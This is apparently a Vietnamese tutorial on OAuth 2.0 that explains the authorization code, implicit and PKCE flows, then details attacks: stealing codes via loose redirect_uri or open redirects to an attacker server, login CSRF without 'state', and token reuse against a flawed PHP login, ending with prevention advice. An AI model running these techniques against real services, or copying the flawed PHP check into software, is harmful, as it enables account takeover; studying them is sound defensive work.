# OAuth

OAuth 2.0 là giao thức ủy quyền cho phép ứng dụng bên thứ ba truy cập các tài nguyên được bảo vệ thay mặt người dùng mà không cần trực tiếp sử dụng mật khẩu của họ. OAuth được sử dụng phổ biến trong việc cấp quyền truy cập API và tích hợp các dịch vụ bên ngoài.

OAuth sẽ gồm 4 thành phần chính:

* **Resource Owner**: chủ sở hữu tài nguyên (user, người mà muốn đăng nhập vào trang web xyz thông qua bên thứ 3)
* **Client**: chính là trang web xyz mà user muốn đăng nhập
* **Authorization Server**: bên thứ 3, nơi mà xác thực resource owner và tạo token để truy cập tới resource server
* **Resource Server**: nơi lưu trữ tài nguyên của user (ví dụ như Drive, Cloud, đôi khi nó cũng có thể là chính Authorization Server, ...)

Đoạn code mô phỏng 1 trang web triển khai dịch vụ OAuth:

```python
...

# CẤU HÌNH THÔNG SỐ OAUTH (Lấy từ Google Developer Console)
CLIENT_ID = "YOUR_CLIENT_://googleusercontent.com"
CLIENT_SECRET = "YOUR_CLIENT_SECRET"
REDIRECT_URI = "http://localhost:5000/callback"  # Phải khớp cấu hình trên Console

# Các URL Endpoints của Google
AUTH_URL = "https://accounts.google.com/o/oauth2/v2/auth"
TOKEN_URL = "https://oauth2.googleapis.com/token"
USERINFO_URL = "https://openidconnect.googleapis.com/v1/userinfo"

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('google_login'))
    ...

@app.route('/login/google')
def google_login():
    # lay trong db check da lien ket account chua ...
    ...
    params = {
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "response_type": "code",
        "scope": "openid email profile",
        "state": csrf_token
    }

    url = AUTH_URL + '?' + urlencode(params)
    return redirect(url)

@app.route('/callback')
def callback():

    # check co ton tai cac truong code, state, error khong ...

    code = request.args.get("code")
    state = request.args.get("state")
    
    ... # check csrf token ...

    data_get_token = {
        "client_secret": CLIENT_SECRET,
        "code": code,
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code"
    }

    r = requests.post(TOKEN_URL, data=data_get_token).json()
    access_token = r.get("access_token")
    
    ...
    # xác minh id_token ( được trả về cùng với access_token khi mà scope có đính kèm openid ): đây là 1 jwt có chứa iss, exp, ...
    ...

    headers = {"Authorization": f"Bearer {access_token}"}
    data_user = requests.get(USERINFO_URL, headers=headers).json()
    
    ...
    # khoi tao session, link account ...
    ...
    return redirect_for('profile')

...

```

OAuth được chia thành 2 loại chính `Authorization Code Grant` và `Implicit Grant`

## Authorization Code Grant

Flow của loại này như sau (lấy example oauth code ở trên để làm ví dụ):

Khi người dùng click vào login with google, trang được chuyển tới endpoint xử lí điểm khởi đầu của oauth tại web server (client) (ví dụ ở đoạn code trên thì đây là `/login/google`) tại đây thì nó thực hiện redirect người dùng tới goole auth endpoint. 

Request này được gọi là `Authorization Request`: 

```http
# user gửi
GET /auth?client_id=...&redirect_uri&response_type=code&scope=...&state=...
Host: accounts.google.com (Authorization Server)
...
```

Request này gồm 4 trường:

* **client_id**: đây là identified id giữa web server (client) và authorization server (ví dụ trong google thì nó được tạo khi ta cấu hình thông số OAuth qua Google Developer Console) - xác định ứng dụng nào đang thực hiện yêu cầu
* **redirect_uri**: uri mà authorization server sẽ thực hiện redirect tới khi mà authorize thành công giữa user và auth server ( giá trị này cũng chính là endpoint sẽ thực hiện xử lí oauth, trao đổi token, lấy tài nguyên của web server - trong đoạn code ví dụ trên nó sẽ là `/callback`)
* **response_type**: lựa chọn loại OAuth (code grant hay implicit grant), trong code grant giá trị của nó luôn là `code`
* **scope**: tài nguyên mà web server (client) muốn truy cập (optional)
* **state**: tương tự như csrf token (optional)

Request này sẽ trả về giao diện đăng nhập của authorization server, và sau khi user login và consent (`Resource Owner Authentication`), thì authorization server sẽ thực hiện redirect tới url được cung cấp trong `redirect_url` kèm theo 1 `code`. Request redirect này được gọi là `Authorization Code Grant`:

```http
# user được redirect tới trang này
GET /callback?code=...&state=...
Host: <client_host>
...
```
request này có thêm 1 trường mới đó là `code`, đây là token được tạo bởi auth server và trả về để dùng nó trao đổi lấy access_token truy cập tới resoure server.

Tại `redirect_url` (`/callback`) (bỏ qua các bước xử lí kiểm tra) nó thực lấy giá trị `code` trong query string và gửi kèm theo 1 giá trị client secret để lấy access_token.

Request này được gọi là `Access token request` (Request này được gửi từ web server tới auth server vì thế nên nó hoàn toàn trong suốt với user):

```http
POST /token 
Host: <auth_server>

client_id=...&client_secret=...&redirect_uri=...&code=...&grant_type=authorization_code
```

Request này có 2 trường mới là:

* **client_secret**: đây là giá trị bí mật giữa web server và auth server và cũng được tạo trong khi cấu hình oauth qua google devoloper console) - xác thực với ứng dụng google
* **grant_type**: xác định loại giao thức OAuth, mặc định có giá trị là `authorization_code` trong trường hợp này.

Khi nhận được request, auth server thực hiện validate code và issue access token, response của request này có dạng

Bước này được gọi là `Access Token Grant`

```json
{
"access_token":"RsT5OjbzRn430zqMLgV3Ia",
"expires_in":3600,
...
}
```
Sau khi có được `access_token`, `/callback` tiếp tục thực hiện gửi nó tới resource server để lấy tài nguyên mà ta cần.

Bước này được gọi là `Resource Request`, request này cũng là web server <-> resource server nên nó cũng hoàn toàn trong suốt với user

```http
GET /user_info
Host: <resource_server>
Authorization: Bearer <access_token>
```
Bước này trả về thông tin mà ta cần dựa trên giá trị `scope` ban đầu

`Resource Response`

```
{username: "john", email: "[email protected]", id: 1337}
```
sau đó callback xử lí logic (link account, tạo session, ...) và cuối cùng mới trả về response cho user.

## Implicit Grant

Implicit Grant được thiết kế nhằm hỗ trợ các ứng dụng chạy trực tiếp trên trình duyệt (ví dụ: SPA). Đối với các ứng dụng này, mã nguồn JavaScript được tải xuống và thực thi ngay trên trình duyệt của người dùng. Vì vậy, người dùng có thể xem mã nguồn và các thông tin được nhúng trong đó thông qua Developer Tools, khiến việc lưu trữ bí mật `client_secret` trở nên không an toàn.

Cơ chế hoạt động tương tự Authorization Code Grant, nhưng thay vì trả về `authorization_code` qua `redirect_uri`, Authorization Server trả trực tiếp `access_token` cho ứng dụng thông qua URL redirect (thường nằm trong URL fragment). SPA có thể sử dụng token này để truy cập Resource Server mà không cần thực hiện thêm bước trao đổi mã xác thực tại Token Endpoint.

Tuy nhiên, việc trả trực tiếp `access_token` qua trình duyệt làm tăng nguy cơ rò rỉ token khi ứng dụng gặp các lỗ hổng như XSS hoặc cấu hình không an toàn. Do đó, Implicit Grant hiện không còn được khuyến nghị sử dụng theo các hướng dẫn bảo mật OAuth 2.0 hiện đại.

### PKCE (Proof Key for Code Exchange)

PKCE là cơ chế bổ sung cho Authorization Code Grant nhằm bảo vệ `authorization_code` khỏi nguy cơ bị đánh cắp và sử dụng trái phép. Cơ chế này đặc biệt hữu ích đối với các ứng dụng không thể bảo mật `client_secret` như SPA và ứng dụng di động.

Quy trình hoạt động:

1. **Tạo Code Verifier:** Client tạo một chuỗi ngẫu nhiên bí mật (`code_verifier`).
2. **Tạo Code Challenge:** Client tính giá trị `code_challenge` từ `code_verifier` bằng thuật toán SHA-256.
3. **Gửi Authorization Request:** Client gửi `code_challenge` và phương thức mã hóa (`code_challenge_method=S256`) đến Authorization Server.
4. **Nhận Authorization Code:** Sau khi người dùng xác thực và cấp quyền, Authorization Server trả về `authorization_code` như thông thường.
5. **Trao đổi Token:** Client gửi `authorization_code` kèm `code_verifier` đến Token Endpoint.
6. **Xác minh PKCE:** Authorization Server tính lại giá trị từ `code_verifier` và so sánh với `code_challenge` đã nhận trước đó. Nếu khớp, quá trình trao đổi token được chấp nhận.

Nhờ cơ chế này, ngay cả khi kẻ tấn công đánh cắp được `authorization_code`, chúng cũng không thể đổi mã lấy token nếu không có `code_verifier` tương ứng.

Hiện nay, **Authorization Code Grant kết hợp PKCE** là phương thức được khuyến nghị thay thế Implicit Grant trong các ứng dụng SPA và ứng dụng di động.

# OAuth Attack

## Stealing Auth code via redirect_uri

Khi mà đăng kí OAuth service với 1 bên thứ 3, ta cần set 1 trường đó là `Authorized redirect URIs`. Ở bước Authorization Request, khi mà user login và consent thành công rồi, auth server sẽ thực hiện kiểm tra trường `redirect_uri` có khớp chính xác với giá trị trong `Authorized redirect URIs` không. Nếu khớp auth server mới thực hiện redirect kèm auth code về uri đó. Ngược lại, nó sẽ bị từ chối.

Nếu giá trị của `Authorized redirect URIs` được cấu hình lỏng lẻo, nó có thể bị lợi bởi attack theo 1 số cách bên dưới. (Hiện nay, các bên như google,... đã ép giá trị này phải khớp chính xác 1 endpoint cụ thể và không chấp nhận cả wildcard nên các cuộc tấn công dựa vào trường này gần như không còn xảy ra)

### Kịch bản 1: thay giá trị redirect_uri thành attacker server

```http
GET /auth?client_id=...&redirect_uri=<attack_controlled_server>&scope=...&state=...&response_type=code
Host: <auth_server>
```
(Giá trị client_id ta có thể lấy bằng cách tạo 1 flow oauth thông thường, ở request đầu tiên ta sẽ xem được giá trị này, state ta có thể điền giá trị bất kì, tuy nhiên cuộc tấn công này cũng chỉ thành công trong trường hợp client không check state)

Nếu giá trị redirect_uri bị cấu hình sai thì, ta có thể gửi url này cho victim sau khi victim login và consent xong thì auth code sẽ được gửi về attacker server. Khi có được auth code này rồi thì ta sẽ thực hiện gửi nó tới `/callback` của client để hoàn thành nốt flow oauth còn lại:

```http
GET /callback?code=<vừa steal được>&state=...
Host: <web server>
```
Sau đó ta sẽ login thành công vào client với tài khoản của victim.

**Note**: nếu auth server thực hiện kiểm tra xem `redirect_uri` trong `auth request` và trong `token grant request` có khớp không thì cuộc tấn công này không thành công. Tương tự, nếu có sử dụng PKCE thì ta cũng không thể khai thác trong trường hợp này.

### Kịch bản 2: Bypassing Flawed Validation

Trong thực tế, OAuth thường validate giá trị `redirect_uri` này. Ta có thể sử dụng 1 số phương pháp bypass như dùng trong ssrf: `https://github.com/son-ops/CheatSheet/tree/main/SSRF`. Khi bypass thành công, ta thực hiện các bước tương tự như trên.

## Steal Auth Code via Open Redirect

Trong trường hợp OAuth Server kiểm tra `redirect_uri` nhưng cho phép các URI thuộc một domain hoặc đường dẫn nhất định (ví dụ: `http://<client-server>/*`), attacker có thể kết hợp với lỗ hổng Open Redirect tồn tại trên chính Client để đánh cắp authorization code.

Giả sử Client tồn tại một endpoint bị lỗi Open Redirect:

```http
GET /profile?url=<attacker_url>
```

Endpoint này cho phép chuyển hướng người dùng đến URL do attacker kiểm soát. Attacker có thể lợi dụng endpoint đó làm `redirect_uri` trong authorization request:

```http
GET /auth?client_id=...&scope=...&response_type=code&redirect_uri=http%3A%2F%2F%3Cclient-server%3E%2Fprofile%3Furl%3Dhttps%253A%252F%252F%3Cattacker-server%3E
```

Sau khi victim hoàn tất xác thực, OAuth Server chuyển hướng trình duyệt về URI đã cung cấp và trả authorization code thông qua query string:

`http://<client-server>/profile?url=https://<attacker-server>&code=ABC123`

Nếu endpoint Open Redirect chuyển tiếp cả query string chứa `code` khi redirect, trình duyệt sẽ tiếp tục truy cập attacker server với authorization code:

`https://<attacker-server>/?code=ABC123`

Attacker từ đó có thể thu thập authorization code.

**Lưu ý:** Open Redirect không mặc nhiên chuyển tiếp authorization code. Kỹ thuật này chỉ khả thi khi endpoint redirect có hành vi chuyển tiếp query string hoặc toàn bộ URL chứa code. Ngoài ra, việc đánh cắp code không đồng nghĩa attacker chắc chắn đổi được code lấy access token, vì authorization code thường được ràng buộc với `client_id`, `redirect_uri` và có thể cả PKCE `code_verifier`.

### Trường hợp Implicit Flow

Nếu OAuth sử dụng Implicit Flow (`response_type=token`), access token được trả trực tiếp trong URL fragment thay vì authorization code:

`http://<client-server>/callback#access_token=XYZ123`

Trong trường hợp này, nếu endpoint Open Redirect trả về redirect đến attacker server mà không chỉ định fragment mới, trình duyệt có thể kế thừa fragment từ URL trước đó. Điều này có thể khiến access token tiếp tục xuất hiện trong URL tại attacker server.

Khác với Authorization Code Flow, Implicit Flow không cần thực hiện thêm bước gửi authorization code đến Token Endpoint để đổi lấy access token.

## Improper CSRF Protection

Như đã nói ở trên, tham số `state` được sử dụng như một giá trị `csrf_token`. Tuy nhiên nó là optional, nếu client không triển khai sử dụng giá trị này. Ta có thể khai thác tương tự như khai thác CSRF attack.

**Kịch bản ví dụ**: thực hiện đăng nhập vào tài khoản attacker và nhận auth code. Tạo callback URL với auth code vừa lấy được sau đó gửi URL đó cho victim.
* Nếu victim chưa đăng nhập -> victim sẽ đăng nhập vào tài khoản của attacker. Nếu sau đó, victim thực hiện gửi lên các thông tin nhạy như ngân hàng, ... -> bị attacker xem được
* Nếu victim đã đăng nhập -> tài khoản của victim có thể sẽ được linking account với tài khoản của attacker nếu callback xử lí sai. Khi attacker đăng nhập với tài khoản qua OAuth sẽ vào được tài khoản của victim đang sử dụng.

**Các bước thực hiện khai thác**:

Attacker gửi request đăng nhập bằng tài khoản của mình:

```http
POST /authorization/signin HTTP/1.1
Host: <auth_server>
Content-Type: application/x-www-form-urlencoded

username=attacker&password=attacker
&client_id=0e8f12335b0bf225
&redirect_uri=/client/callback
```

Sau khi xác thực thành công, auth server cấp auth code. Ví dụ response có thể chứa:

```http
HTTP/1.1 302 Found
Location: /client/callback?code=ABC123
```

Lúc này, attacker cần lấy `auth code` nhưng mà lại không muốn nó tiếp tục xử lí ở `callback`, ta có thể thực hiện nó bằng cách:

* Sử dụng Burp Suite để intercept response và đọc `Location`
* Sử dụng để gửi request và đọc response mà không tự động follow redirect

```bash
curl -i -X POST http://<auth-server>/authorization/signin \
-d "username=attacker&password=attacker&client_id=0e8f12335b0bf225&redirect_uri=/client/callback"
```
Sau khi có được auth code, attacker thực hiện tạo url tới callback với auth code vừa có được: `http://<client-server>/callback?code=<auth_code_vừa_lấy được>` và gửi nó tới cho victim. 

## OAuth Token Abuse

Authorization Server cho phép bất kì client nào đăng kí dịch vụ OAuth. Tận dụng điều này, attacker có thể đăng kí 1 dịch vụ OAuth dưới quyền kiểm soát của mình và triển khai nó trên 1 trang web uy tín (normal website), nếu user sử dụng dịch vụ OAuth trên trang web này, attacker có thể có được access token gắn với tài khoản của user đó. Sau đó, nếu 1 trang web khác có chứa lỗi, tương tự như ví dụ bên dưới:

Giả sử website B có endpoint /login/facebook.php xử lý đăng nhập bằng Facebook.

```php
<?php

$accessToken = $_POST['access_token'] ?? '';

if (empty($accessToken)) {
    http_response_code(400);
    exit('Missing access token');
}

// Gửi token đến Facebook để lấy thông tin người dùng.
$url = 'https://graph.facebook.com/me?fields=id,name,email'
     . '&access_token=' . urlencode($accessToken);

$response = file_get_contents($url);
$userInfo = json_decode($response, true);

if (empty($userInfo['email'])) {
    http_response_code(401);
    exit('Invalid Facebook token');
}

// Tìm tài khoản trên website bằng email Facebook trả về.
$user = findUserByEmail($userInfo['email']);

if (!$user) {
    http_response_code(401);
    exit('Account not found');
}

// ĐĂNG NHẬP NGƯỜI DÙNG
$_SESSION['user_id'] = $user['id'];

echo 'Login successful';
```
Ta thấy nó sử dụng luôn access token mà không check nó thuộc về client id nào. Thì attacker có thể dùng access token mà nó chiếm được và đăng nhập trực tiếp trang web này dưới tài khoản của user bị đánh cắp.

## Others

Flawed validation scope parameter (Nếu scope có openid or response_type chứa id_token thử truy cập vào `/.well-known/openid-configuration` để đọc openid document -> tiết lộ sensetive information)

# Prevention

* Để ngăn chặn CSRF, bắt buộc phải sử dụng tham số `state`
* Nên sử dụng `Code grant` thay vì `Implicit grant` nếu có thể
* Nên sử dụng thêm cơ chế PKCE
* Khi đăng kí redirect uri với Authorization Server cần đăng kí khớp chính xác
